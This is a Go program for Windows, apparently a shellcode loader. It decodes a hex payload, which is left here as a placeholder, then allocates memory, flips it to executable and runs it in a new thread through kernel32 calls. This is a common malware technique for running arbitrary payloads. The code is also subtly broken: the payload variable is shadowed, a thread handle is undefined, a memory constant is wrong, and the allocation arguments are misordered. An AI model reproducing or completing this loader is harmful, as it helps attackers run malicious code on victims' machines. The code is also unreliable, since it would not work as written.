package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	PAGE_EXECUTE_READ        = 0x20
	PAGE_READWRITE          = 0x20 | 0x1000
	MEM_COMMIT               = 0x1000
	MEM_RESERVE             = 0x2000
	MEM_ZERO_INIT           = 0x40
)
var (
	verboseOutput bool
	debugOutput  bool
	shellcode     []byte
)

func main() {
	verboseOutput = *flag.Bool("verbose", false, "Enable verbose output")
	debugOutput  = *flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	shellcode, err := hex.DecodeString("YourHexEncodedShellcodeHere")
	if err != nil {
		log.Fatal(fmt.Sprintf("[!]Error decoding hex string: %s", err.Error()))
	}

	loadAndExecuteShellcode()
	if verboseOutput {
		fmt.Println("[-]Allocated", len(shellcode), "bytes")
	}
	if debugOutput {
		fmt.Println("[+]Shellcode Executed")
	}
}

func loadAndExecuteShellcode() {
	var oldProtect uint32
	var lpAddress uintptr

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	lpAddress, _, _ = VirtualAlloc.Call(0, uintptr(len(shellcode)), PAGE_READWRITE|MEM_COMMIT, MEM_RESERVE|MEM_ZERO_INIT)
	if lpAddress == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	_, _, _ = VirtualProtect.Call(lpAddress, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if oldProtect == 0 {
		log.Fatal("[!]VirtualProtect failed and returned 0")
	}

	_, _, _ = CreateThread.Call(0, 0, lpAddress, uintptr(0), 0, 0)
	if _, _, syscallErr := WaitForSingleObject.Call(thread, 0xFFFFFFFF); syscallErr != 0 {
		log.Fatal(fmt.Sprintf("[!]WaitForSingleObject failed: %v", syscallErr))
	}
}

func init() {
	rand.Seed(time.Now().UnixNano())
}